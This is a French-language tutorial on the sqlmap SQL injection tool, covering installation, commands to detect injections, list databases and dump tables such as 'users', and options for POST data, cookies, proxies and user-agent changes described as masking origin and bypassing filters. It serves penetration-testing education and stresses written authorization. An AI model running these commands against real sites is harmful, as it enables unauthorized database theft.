# Sqlmap

## Sqlmap - Guide Complet

⚠️ **Avertissement** : Ce contenu est strictement destiné à un usage éducatif et éthique dans le domaine de la cybersécurité. Toute utilisation illégale ou malveillante est interdite et engage la seule responsabilité de l’utilisateur.

***

### Introduction

**Sqlmap** est un outil open-source automatisé pour la détection et l'exploitation des vulnérabilités d'injection SQL. Il est conçu pour aider les pentesters et les auditeurs de sécurité à identifier les failles SQL dans les applications web et à extraire les données sensibles des bases de données.

***

### 🚀 Étape 1 : Installation de Sqlmap

***

#### Sous Linux (Debian/Ubuntu)

1.  **Mettre à jour les paquets** :

    ```bash
    sudo apt update && sudo apt upgrade
    ```
2.  **Installer Sqlmap** :

    ```bash
    sudo apt install sqlmap
    ```
3.  **Vérifier l’installation** :

    ```bash
    sqlmap --version
    ```

***

#### Sous Windows

1. Téléchargez Sqlmap depuis le dépôt officiel : [Sqlmap GitHub](https://github.com/sqlmapproject/sqlmap).
2. Extrayez l'archive ZIP dans un répertoire.
3.  Ouvrez une invite de commande et exécutez Sqlmap :

    ```bash
    python sqlmap.py --help
    ```

***

### 🛠️ Étape 2 : Commandes de Base

***

#### 1. Tester une URL pour les Injections SQL

**Commande :**

```bash
sqlmap -u "http://example.com/page.php?id=1"
```

* **Explication** :
  * `-u` : Spécifie l'URL cible avec le paramètre à tester.
  * Sqlmap détectera automatiquement les vulnérabilités d'injection SQL sur le paramètre spécifié.

***

#### 2. Détecter les Bases de Données

**Commande :**

```bash
sqlmap -u "http://example.com/page.php?id=1" --dbs
```

* **Explication** :
  * `--dbs` : Liste toutes les bases de données disponibles après avoir détecté une vulnérabilité.

***

#### 3. Extraire des Tables et Données

**Commande :**

```bash
sqlmap -u "http://example.com/page.php?id=1" --dbs --tables -D <database_name> -T <table_name> --dump
```

* **Explication** :
  * `--tables` : Liste les tables dans la base de données spécifiée (`-D <database_name>`).
  * `--dump` : Extrait toutes les données de la table spécifiée (`-T <table_name>`).

***

### 🔍 Étape 3 : Commandes Avancées

***

#### 1. Tester avec des Données POST

Si la cible utilise des requêtes POST (formulaires ou API) :

```bash
sqlmap -u "http://example.com/page.php" --data="username=admin&password=1234"
```

* **Explication** :
  * `--data` : Spécifie les données POST envoyées dans la requête.

***

#### 2. Ajouter des Cookies

Si la cible nécessite une authentification par cookie :

```bash
sqlmap -u "http://example.com/page.php?id=1" --cookie="SESSIONID=abcd1234"
```

* **Explication** :
  * `--cookie` : Inclut des cookies pour maintenir une session authentifiée ou tester les paramètres de session.

***

#### 3. Utiliser un Proxy

Pour acheminer les requêtes via un proxy et masquer l'origine :

```bash
sqlmap -u "http://example.com/page.php?id=1" --proxy="http://127.0.0.1:8080"
```

* **Explication** :
  * `--proxy` : Redirige le trafic via un serveur proxy (utile pour anonymiser ou capturer les requêtes via des outils comme Burp Suite).

***

#### 4. Spécifier des Techniques d'Injection

Pour tester des types spécifiques d'injection SQL (par exemple : Blind, Error-based) :

```bash
sqlmap -u "http://example.com/page.php?id=1" --technique=BEUSTQ
```

* **Explication** :
  * `--technique` : Spécifie les techniques d'injection SQL à tester (par exemple : `B` pour Blind, `E` pour Error-based).

***

#### 5. Ignorer les Bases de Données Système

Pour exclure les bases de données système (par exemple : `information_schema`, `mysql`) :

```bash
sqlmap -u "http://example.com/page.php?id=1" --exclude-sysdbs
```

* **Explication** :
  * `--exclude-sysdbs` : Filtre les bases de données système dans les résultats.

***

#### 6. Définir un Agent Utilisateur Personnalisé

Pour contourner certains pare-feu ou filtres :

```bash
sqlmap -u "http://example.com/page.php?id=1" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
```

* **Explication** :
  * `--user-agent` : Modifie l'agent utilisateur pour simuler un navigateur spécifique.

***

#### 7. Limiter l'Impact sur le Serveur

Pour éviter de surcharger le serveur cible :

```bash
sqlmap -u "http://example.com/page.php?id=1" --delay=5 --randomize=USER-AGENT
```

* **Explication** :
  * `--delay` : Ajoute un délai (en secondes) entre chaque requête.
  * `--randomize` : Change aléatoirement l'agent utilisateur à chaque requête.

***

### 📋 Scénarios d’Utilisation

***

#### Exemple 1 : Détection Simple d'Injection SQL

**Commande :**

```bash
sqlmap -u "http://example.com/page.php?id=1"
```

* **Explication** : Teste la vulnérabilité d'injection SQL pour le paramètre `id` dans l'URL.

***

#### Exemple 2 : Exploitation et Extraction de Données

**Commande :**

```bash
sqlmap -u "http://example.com/page.php?id=1" --dbs --tables -D example_db -T users --dump
```

* **Explication** : Liste les bases de données (`--dbs`), les tables (`--tables`), et extrait les données de la table `users` dans la base `example_db`.

***

#### Exemple 3 : Masquer l’Origine avec un Proxy

**Commande :**

```bash
sqlmap -u "http://example.com/page.php?id=1" --proxy="http://127.0.0.1:8080"
```

* **Explication** : Acheminer les requêtes via un proxy pour anonymiser l'origine.

***

#### Exemple 4 : Tester un Formulaire Authentifié

**Commande :**

```bash
sqlmap -u "http://example.com/login.php" --data="username=admin&password=1234" --cookie="SESSIONID=abcd1234"
```

* **Explication** : Inclut les données POST et un cookie de session pour tester les vulnérabilités dans un formulaire authentifié.

***

### 📖 Bonnes Pratiques

***

#### 1. Obtenir des Autorisations

* **Respectez les lois** : Ne testez jamais une application sans autorisation écrite.
* **Éthique** : Agissez dans le respect des règles et des politiques de sécurité.

#### 2. Minimiser l’Impact

* **Limitez vos tests** : Évitez de surcharger les serveurs avec des requêtes inutiles.
* **Configurez des délais** : Ajoutez des pauses entre les requêtes pour réduire l'impact.

#### 3. Analyser les Résultats

* Vérifiez soigneusement les réponses pour identifier les vulnérabilités avec précision.
* Ne prenez pas les résultats de Sqlmap comme définitifs sans validation manuelle.

### Conclusion

**Sqlmap** est un outil incontournable pour les pentesters et auditeurs de sécurité. Avec sa capacité à automatiser la détection et l'exploitation des injections SQL, il simplifie les tests tout en fournissant des options avancées pour répondre aux besoins les plus complexes.
